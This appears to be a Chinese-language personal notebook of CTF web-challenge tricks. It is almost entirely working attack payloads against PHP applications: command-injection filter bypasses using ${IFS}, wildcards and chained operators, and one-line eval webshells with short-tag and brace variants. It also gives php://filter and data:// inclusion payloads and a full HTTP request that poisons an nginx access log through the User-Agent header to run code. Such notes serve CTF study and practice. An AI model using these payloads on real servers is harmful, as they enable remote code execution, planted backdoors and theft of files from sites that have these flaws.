# 笔记

<br><br>

## 杂笔记

<br>

* 在逆向(星号)((BYTE*)的时候用宏定义#define BYTE unsigned char即可正常使用

<br>

* system("tac flag.php")用来读取文件内容;

<br>

* ?c=system("tac%20fla(星号)")意思是c=system("tac flag");


<br><br>

## 命令绕过  

<br>

### 黑洞绕过：system($c." >/dev/null 2>&1");
* 它只会让分号后面的指令进入黑洞，所以这里直接绕过

* 双写分号绕过?c=tac f*;ls
* 双写&&绕过?c=tac f*%26%26ls（注：星号被绕过可以用问号）（[0-9]和%的过滤是不会过滤%26之类的）（）

* 带行号绕过?c=nl<fla''g.php%7C%7Cls(此方法可能要右键看源代码)

* 有$的情况下可以重命名flag.php成txt再直接访问:先执行?c=mv${IFS}fla?.php${IFS}a.txt%7C%7Cls 然后使用ls||ls看看有没有命名成功。成功后直接访问a.txt

* 其他注：?c=ls${IFS}/||ls查看根目录（ls /）

* ?c=cp${IFS}/fla?${IFS}/var/www/html/b.txt（将根目录（ls /）下的flag复制到可以直接在url的目录）





### 直接写php时：
* 经典一句话木马：<?php @eval($_POST[a]); ?>
* 短标签（过滤php）绕过：<?=eval($_POST[a]);?>（需要配合user.ini打开权限）
* 过滤[]:<?=eval($_POST{a});?>(改成花括号)
* 过滤分号’；‘：<?=`cat ../flag*`?> <?=`tac ../f*`?> <?=`nl ../flag*`?>查看源码得flag




<br>

### 直接eval()传参时：
* 特殊字符:"$""&"如果只是对c进行过滤，就可以通过包含另一个函数来绕过
* 做题前先看看对谁过滤，再看如何过滤
* c=include$_GET[1]?>&1=php://filter/read=convert.base64-encode/resource=flag.php
* c=include$_GET[1]?>&1=data://text/plain,<?php system("nl flag.php")?>
* c=$nice=include$_GET["url"]?>&url=php://filter/read=convert.base64-encode/resource=flag.php
* 仅括号
* c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));
* c=eval(next(reset(get_defined_vars())));&1=;system("tac%20flag.php");
* c=show_source(next(array_reverse(scandir(pos(localeconv())))));
* c=highlight_file(next(array_reverse(scandir(dir))));
<br>

### 当include(c)时：直接使用协议绕过
* c=data://text/plain,<?php system('tac f*');?>

<br>

#### php被过滤的时候:
* ?c=data://text/plain,<?=system("tac fla*")?>
* 注：include()只会处理<?php>里面的内容

<br>

#### $被过滤的时候:
* ?c=echo highlight_file(next(array_reverse(scandir(pos(localeconv())))));
* ?c=eval(next(reset(get_defined_vars())));&1=;system("tac%20flag.php");

<br>

#### 日志文件包含：（抓包改UA，在UA末尾加东西）
* 如：
````
GET /?file=/var/log/nginx/access.log HTTP/1.1
Host: 4e9bb3c0-1021-427e-81a3-42e5e6e13c39.challenge.ctf.show
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:46.0) Gecko/20100101 Firefox/46.0<?php eval($_GET[2]);?>       \\在这里改噢
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate
DNT: 1
Cookie: UM_distinctid=17ffcdc88eb73a-022664ffe42c5b8-13676d4a-1fa400-17ffcdc88ec82c
Connection: close
````



<br>

* 可以直接命令执行即可也可以用webshell后门工具连接

* ?file=/var/log/nginx/access.log&2=system('ls /var/www/html');phpinfo();

* ?file=/var/log/nginx/access.log&2=system('tac /var/www/html/fl0g.php');phpinfo();


<br>

### 条件竞争漏洞：（相关：2023年梦极光线上赛web）（文件上传，文件包含等都能用）
- [条件竞争](https://www.freebuf.com/articles/web/275557.html)


<br><br>



## php特性绕过


<br>

### preg_match绕过:
* preg_match第二个参数为0时，会将0x开头当作十六进制,0开头当作八进制
* 多行绕过 php%0aPHP(用于多次preg_match)
* strpos($num, "0")意为开头不能为0，只需要加入%0a（换行）或%09（空格）即可绕过

<br>

### 强弱比较绕过:

* 数组绕过：a[]=1&b[]=2
* md5撞库: 两个不用的明文各自经过MD5加密后，得到相等的hash值(多用于===)
* is_numeric()绕过:is_numeric()函数判断为数字时返回true，否则为false。如果数字为1234%00它就会判断为非数字，而在比较时这通常视为1234





<br>

### 其他总结
* 伪协议绕过:?u=php://filter/read=convert.base64-encode/resource=flag.php(任何打开文件，读取文件的操作都可以使用伪协议绕过)











